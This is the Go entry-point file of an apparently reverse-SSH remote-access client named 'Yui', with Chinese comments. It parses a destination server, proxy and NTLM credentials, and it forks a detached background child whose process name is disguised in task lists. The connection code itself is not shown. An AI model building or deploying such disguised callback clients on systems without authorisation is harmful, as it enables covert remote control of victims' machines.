package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/QingYu-Su/Yui/internal/client"
	"github.com/QingYu-Su/Yui/internal/terminal"
	"github.com/QingYu-Su/Yui/pkg/logger"
)

// fork 创建一个新进程
// 参数:
//
//	path - 要执行的程序路径
//	sysProcAttr - 新进程的系统属性设置
//	pretendArgv - 传递给新进程的参数列表
//
// 返回值:
//
//	error - 如果进程创建失败则返回错误
func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {
	// 创建一个新的命令对象
	cmd := exec.Command(path)

	// 设置命令参数
	cmd.Args = pretendArgv

	// 在环境变量中添加F=当前进程参数，用空格连接
	cmd.Env = append(os.Environ(), "F="+strings.Join(os.Args, " "))

	// 将标准输出和错误输出重定向到父进程
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// 设置进程属性
	cmd.SysProcAttr = sysProcAttr

	// 启动新进程
	err := cmd.Start()

	// 如果进程创建成功，释放父进程对子进程的引用
	if cmd.Process != nil {
		cmd.Process.Release()
	}

	return err
}

// 全局变量定义
var (
	destination    string // 目标服务器地址
	fingerprint    string // 服务器公钥指纹
	proxy          string // 代理服务器地址
	ignoreInput    string // 忽略输入标志
	customSNI      string // 自定义SNI(服务器名称指示)
	useKerberos    bool   // 是否使用Kerberos认证
	useKerberosStr string // Kerberos标志的字符串形式(用于编译时嵌入)
	logLevel       string // 日志级别
	ntlmProxyCreds string // NTLM代理凭据(DOMAIN\USER:PASS格式)
)

// printHelp 打印帮助信息
func printHelp() {
	// 打印基本用法
	fmt.Println("用法: ", filepath.Base(os.Args[0]), "--[foreground|fingerprint|proxy|process_name] -d|--destination <server_address>")

	// 打印各参数说明
	fmt.Println("\t\t-d 或 --destination\t服务器连接地址(可预置)")
	fmt.Println("\t\t--foreground\t客户端在前台运行而不转入后台")
	fmt.Println("\t\t--fingerprint\t服务器公钥SHA256指纹(用于认证)")
	fmt.Println("\t\t--proxy\t要使用的HTTP连接代理地址")
	fmt.Println("\t\t--ntlm-proxy-creds\tNTLM代理凭据，格式为DOMAIN\\USER:PASS")
	fmt.Println("\t\t--process_name\t在任务列表/进程列表中显示的名称")
	fmt.Println("\t\t--sni\t使用TLS时设置客户端请求的SNI值")
	fmt.Println("\t\t--log-level\t更改日志输出级别，可选[INFO,WARNING,ERROR,FATAL,DISABLED]")

	// Windows特有选项
	if runtime.GOOS == "windows" {
		fmt.Println("\t\t--host-kerberos\t在代理服务器上使用Kerberos认证(如果指定了代理服务器)")
	}
}

func main() {
	// 将字符串形式的Kerberos标志转换为布尔值
	useKerberos = useKerberosStr == "true"

	// 如果没有参数或设置了忽略输入，直接运行主逻辑
	if len(os.Args) == 0 || ignoreInput == "true" {
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
		return
	}

	// 对程序路径进行引号转义处理
	os.Args[0] = strconv.Quote(os.Args[0])
	// 将所有参数拼接为字符串
	var argv = strings.Join(os.Args, " ")

	// 检查是否是子进程（通过环境变量F判断）
	realArgv, child := os.LookupEnv("F")
	if child {
		argv = realArgv // 如果是子进程，使用父进程传递的原始参数
	}

	// 清理环境变量
	os.Unsetenv("F")

	// 解析命令行参数
	line := terminal.ParseLine(argv, 0)

	// 处理帮助请求
	if line.IsSet("h") || line.IsSet("help") {
		printHelp()
		return
	}

	// 检查是否要求在前台运行
	fg := line.IsSet("foreground")

	// 处理代理地址参数
	proxyaddress, _ := line.GetArgString("proxy")
	if len(proxyaddress) > 0 {
		proxy = proxyaddress
	}

	// 处理指纹参数
	userSpecifiedFingerprint, err := line.GetArgString("fingerprint")
	if err == nil {
		fingerprint = userSpecifiedFingerprint
	}

	// 处理SNI参数
	userSpecifiedSNI, err := line.GetArgString("sni")
	if err == nil {
		customSNI = userSpecifiedSNI
	}

	// 处理NTLM代理凭据参数
	userSpecifiedNTLMCreds, err := line.GetArgString("ntlm-proxy-creds")
	if err == nil {
		// 检查是否同时使用了Kerberos认证（互斥）
		if line.IsSet("host-kerberos") {
			log.Fatal("不能同时使用Kerberos认证和静态NTLM代理凭据 (--host-kerberos 和 --ntlm-proxy-creds)")
		}
		ntlmProxyCreds = userSpecifiedNTLMCreds
	} else if len(ntlmProxyCreds) > 0 {
		// 如果全局变量中已有凭据，设置到客户端
		client.SetNTLMProxyCreds(ntlmProxyCreds)
	}

	// 获取进程名参数
	processArgv, _ := line.GetArgsString("process_name")

	// 处理Kerberos认证标志
	if line.IsSet("host-kerberos") {
		useKerberos = true
	}

	// 检查目标地址是否有效
	if !(line.IsSet("d") || line.IsSet("destination")) && len(destination) == 0 && len(line.Arguments) < 1 {
		fmt.Println("未指定目标地址")
		printHelp()
		return
	}

	// 尝试从不同参数获取目标地址
	tempDestination, err := line.GetArgString("d")
	if err != nil {
		tempDestination, _ = line.GetArgString("destination")
	}

	// 更新目标地址
	if len(tempDestination) > 0 {
		destination = tempDestination
	}

	// 如果仍未获取到目标地址，尝试从参数列表中猜测
	if len(destination) == 0 && len(line.Arguments) > 1 {
		// 简单取最后一个参数作为目标地址
		destination = line.Arguments[len(line.Arguments)-1].Value()
	}

	// 处理日志级别设置
	var actualLogLevel logger.Urgency = logger.INFO
	userSpecifiedLogLevel, err := line.GetArgString("log-level")
	if err == nil {
		// 转换用户指定的日志级别
		actualLogLevel, err = logger.StrToUrgency(userSpecifiedLogLevel)
		if err != nil {
			log.Fatalf("无效的日志级别: %q, 错误: %s", userSpecifiedLogLevel, err)
		}
	} else if logLevel != "" {
		// 使用默认日志级别
		actualLogLevel, err = logger.StrToUrgency(logLevel)
		if err != nil {
			actualLogLevel = logger.INFO
			log.Println("默认日志级别无效，设置为INFO: ", err)
		}
	}
	logger.SetLogLevel(actualLogLevel)

	// 再次检查目标地址
	if len(destination) == 0 {
		fmt.Println("未指定目标地址")
		printHelp()
		return
	}

	// 如果是前台模式或子进程，直接运行
	if fg || child {
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
		return
	}

	// 处理标准IO连接的特殊情况
	if strings.HasPrefix(destination, "stdio://") {
		// 对于标准IO连接不能fork，否则会关闭输入输出
		log.SetOutput(io.Discard) // 禁用日志输出
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
		return
	}

	// 尝试fork子进程
	err = Fork(destination, fingerprint, proxy, customSNI, useKerberos, processArgv...)
	if err != nil {
		// 如果fork失败，直接运行
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
	}
}
